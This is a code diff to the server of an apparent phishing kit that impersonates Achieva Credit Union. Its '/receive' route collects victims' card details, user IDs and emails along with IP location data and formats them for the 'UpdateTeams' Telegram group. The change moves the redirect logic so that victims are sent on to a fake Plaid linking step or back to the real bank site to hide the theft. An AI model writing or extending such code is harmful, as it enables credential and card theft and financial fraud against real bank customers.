@@ -240,12 +240,19 @@ app.post('/receive', async (req, res) => {
       `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.send('dn');
+    let url;
+      if(plaid == "on"){
+      	url = "/link?step=1";
+      	}else{
+      	url = "https://www.achievacu.com/";	
+      		}
+
+    res.send({ url:url });
   }
   
   if (myObjects.includes('userid')) {
     message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO\n\n`;
+               `👤 PLAID INFO\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
@@ -257,14 +264,6 @@ app.post('/receive', async (req, res) => {
       `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
       
-      let url;
-      if(plaid == "on"){
-      	url = "/link?step=1";
-      	}else{
-      	url = "https://www.achievacu.com/";	
-      		}
-
-    res.send({ url:url });
   }
   
   if (myObjects.includes('email')) {
